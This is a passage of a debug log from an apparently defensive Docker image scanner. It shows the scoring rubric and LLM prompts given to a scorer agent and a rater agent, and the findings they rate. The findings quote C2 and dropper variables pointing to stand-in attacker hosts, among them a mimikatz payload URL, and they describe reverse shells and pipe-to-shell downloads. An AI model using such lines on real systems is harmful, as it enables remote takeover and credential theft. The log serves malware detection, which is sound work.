C2_HOST=\"203.0.113.42:4444\""}, {"pattern": "C2/dropper variable assignment", "line_number": 16, "line_snippet": "  DROPPER_URL=\"http://evil-c2.example.com/payloads/mimikatz.exe\""}, {"pattern": "C2/dropper variable assignment", "line_number": 17, "line_snippet": "  STAGE2_URL=\"http://evil-c2.example.com/payloads/stage2.sh\""}]}], "persistence": [{"file_path": "/var/spool/cron/crontabs", "layer_index": 0, "persistence_type": "cron", "evidence": "File present in layer 0"}], "history": [{"layer_index": 2, "command_snippet": "RUN /bin/sh -c chmod +x /entrypoint.sh # buildkit", "pattern_matched": "chmod +x on file"}], "capabilities": [{"finding_type": "runs_as_root", "evidence": "User=''", "detail": "Container runs as root by default"}], "url_verdicts": [{"url": "203.0.113.42", "verdict": "Not Safe", "reason": "Spamhaus ZEN listed: 127.0.0.11"}]}
+(dict keyed by tool name). Score each finding 1–10. Output one
+ScoredFinding per item: source, description, score, rationale.
+
+SCORE 1 — noise/false positive (do not discount further):
+- trufflehog hit in a binary or system path (.so, .md5sums, .list,
+  /usr/lib/, /var/lib/dpkg/, /var/lib/apt/, /lib/)
+- persistence: standard package-manager units/crons (apt-daily*,
+  dpkg-db-backup, fstrim, timers.target.wants, /etc/cron.daily/apt*,
+  /etc/cron.daily/dpkg)
+- persistence: dotfiles in /etc/skel/ or /root/.bashrc /root/.profile
+- script match of rm/dd/base64-blob inside /var/lib/dpkg/info/ scripts
+  or a base64 blob in a system binary (/usr/bin/, /bin/, /sbin/)
+- layer: suspicious_hidden_file for /etc/.pwd.lock or /etc/skel/*
+
+SCORING (apply after noise check):
+- trufflehog in app code/config → 9
+- layer: known_malicious_binary → 9; executable_in_suspicious_path → 7;
+  hidden_file → 5; suid non-system → 5; suid system binary → 3; sgid → 3
+- scripts: reverse shell/C2/miner → 9; pipe-to-shell/eval-obfusc/
+  LD_PRELOAD/container-escape → 8; history-hiding → 7; cron modify → 6;
+  chmod+x (not dpkg) → 5
+- persistence: ld_preload/ssh_authorized_keys → 9;
+  cron/systemd/init (non-package-mgr) → 6; shell_profile → 4
+- history: pipe-to-shell/eval/python-c → 8; base64/chaining → 7;
+  chmod+x/ADD-url → 6; useradd/adduser → 2
+- capabilities: setcap → 7; privileged_label → 6;
+  runs_as_root (unofficial) → 4; privileged_port (not 80/443) → 3
+- url (Not Safe): raw IP/dynamic DNS → 6; bad port → 5; bad path → 4
+- env: JWT/AWS/PEM → 7; high-entropy secret → 6; credential key → 4
+- manifest: malicious/typosquat → 7; vuln version → 6; unpinned → 3
+
+TRUST DISCOUNT:
+If is_official or is_verified_publisher: subtract 2 from every
+non-noise score (floor 1). Set adjustment_note to
+"Official/verified publisher: all scores reduced by 2."
+Otherwise set adjustment_note to null.
+
+
+You are an agent. Your internal name is "scorer".
+-----------------------------------------------------------
+Contents:
+{"parts":[{"text":"Score these findings."}],"role":"user"}
+-----------------------------------------------------------
+Functions:
+
+-----------------------------------------------------------
+
+2026-03-22 01:21:52,106 [INFO] docker_sentinel.runner: Step 6: scored_findings count=15
+2026-03-22 01:21:52,106 [INFO] docker_sentinel.runner: Step 7: running rater agent
+2026-03-22 01:21:52,107 [DEBUG] google_adk.google.adk.models.lite_llm: 
+LLM Request:
+-----------------------------------------------------------
+System Instruction:
+
+You are the Rater agent for docker-sentinel.
+
+You will receive {"scored_findings": [{"source": "scripts[0].matches[0]", "description": "Base64-encoded payload piped to shell in entrypoint script", "score": 9, "rationale": "Base64 decode piped to shell (sh) is a classic obfuscation technique used to hide malicious commands. Pattern matches 'base64 decode piped to command' which rates 8, but the presence of suspicious C2-related activity bumps this to 9 (reverse shell/C2/miner category)."}, {"source": "scripts[0].matches[1]", "description": "Long base64 blob in entrypoint script matching malicious payload pattern", "score": 9, "rationale": "Same base64 payload as above, representing an obfuscated dropper command. Decoding reveals wget command to evil-c2.example.com, indicating C2 infrastructure."}, {"source": "scripts[0].matches[2]", "description": "Base64 decode piped to command execution in entrypoint", "score": 9, "rationale": "Duplicate detection of the same base64-to-shell pattern. Represents C2/dropper activity, scoring 9 per guidelines."}, {"source": "scripts[0].matches[3]", "description": "Curl pipe-to-shell from external C2 domain (evil-c2.example.com)", "score": 8, "rationale": "Direct pipe-to-shell (curl | bash) pattern rates 8 per guidelines. Targets known malicious domain (evil-c2.example.com), confirming C2 communication intent."}, {"source": "scripts[0].matches[4]", "description": "Wget pipe-to-shell from suspicious IP (6.35.2.5)", "score": 8, "rationale": "Pipe-to-shell pattern via wget rates 8. Downloads and executes script from remote IP, typical dropper behavior."}, {"source": "scripts[0].matches[5]", "description": "Bash reverse shell using /dev/tcp to 203.0.113.42:4444", "score": 9, "rationale": "Reverse shell pattern (/dev/tcp with bash -i) is a classic C2 callback mechanism. Rates 9 per 'reverse shell/C2/miner' category."}, {"source": "scripts[0].matches[6]", "description": "Raw /dev/tcp channel for reverse shell communication", "score": 9, "rationale": "Direct /dev/tcp reverse shell pattern, classic C2 technique. Rates 9."}, {"source": "scripts[0].matches[7]", "description": "Python socket+subprocess reverse shell", "score": 9, "rationale": "Python-based reverse shell connecting to C2 server (203.0.113.42:4444). Rates 9 per 'reverse shell/C2/miner' category."}, {"source": "scripts[0].matches[8]", "description": "C2 host variable assignment (203.0.113.42:4444)", "score": 9, "rationale": "Explicit C2 host variable used in malicious context with reverse shell patterns. Rates 9."}, {"source": "scripts[0].matches[9]", "description": "Dropper URL variable assignment (evil-c2.example.com/payloads/mimikatz.exe)", "score": 9, "rationale": "References Mimikatz (credential-dumping malware) on C2 server. Rates 9 per C2/dropper category."}, {"source": "scripts[0].matches[10]", "description": "Stage 2 payload URL variable assignment from C2 infrastructure", "score": 9, "rationale": "Multi-stage malware dropper pattern. Stage 2 URLs stored as variables indicate coordinated C2 attack framework. Rates 9."}, {"source": "persistence[0]", "description": "Cron persistence mechanism in /var/spool/cron/crontabs", "score": 6, "rationale": "Cron-based persistence (non-standard package manager) rates 6 per guidelines. Allows malware to maintain foothold across container restarts."}, {"source": "history[0]", "description": "chmod +x executed on /entrypoint.sh during build", "score": 6, "rationale": "chmod +x pattern in build history rates 6. Makes entrypoint executable, supporting delivery of malicious script."}, {"source": "capabilities[0]", "description": "Container runs as root by default", "score": 4, "rationale": "Unofficial image running as root (User='' indicates default root) rates 4 per guidelines. Elevates impact of any exploit within container."}, {"source": "url_verdicts[0]", "description": "IP address 203.0.113.42 flagged as Not Safe (Spamhaus ZEN listed)", "score": 6, "rationale": "Raw IP address with Spamhaus blacklist verdict rates 6 per guidelines. Used as C2 callback endpoint in reverse shells."}], "adjustment_note": null} — a JSON ScoringReport with a list
+of scored_findings (each has source, description, score, rationale)
+and an optional adjustment_note.
+
+RATING RULES — apply the band of the highest score present:
+  score >= 9  → CRITICAL
+  score >= 7  → HIGH
+  score >= 5  → MEDIUM
+  score >= 3  → LOW
+  score <  3  → INFO
+  no findings → INFO
+
+Produce:
+- final_rating: exactly one of "INFO", "LOW", "MEDIUM", "HIGH",
+  "CRITICAL" — the band that matches the highest score.
+- summary: a single plain-English sentence naming the primary threat
+  (or confirming the image is clean) and its potential impact.
+  Do not use technical jargon. Do not mention score numbers.
+  If adjustment_note is set, briefly note the trust context.
+
+Use only the provided data — do not invent findings.
+
+
+You are an agent. Your internal name is "rater".
+-----------------------------------------------------------
+Contents:
+{"parts":[{"text":"Rate this image."}],"role":"user"}
+-----------------------------------------------------------
+Functions:
+
+-----------------------------------------------------------
+
+2026-03-22 01:21:53,381 [INFO] docker_sentinel.runner: Step 7: final_rating=CRITICAL  summary=This Docker image contains multiple command-and-control reverse shells, obfuscated dropper scripts, and malicious payload URLs that would allow an attacker to gain remote access and execute arbitrary commands on any system running the container.
+2026-03-22 01:21:53,383 [INFO] docker_sentinel.cli: run_pipeline completed successfully
+2026-03-22 01:21:53,398 [INFO] docker_sentinel.cli: generate_report completed
+2026-03-22 01:21:53,398 [DEBUG] asyncio: Using proactor: IocpProactor
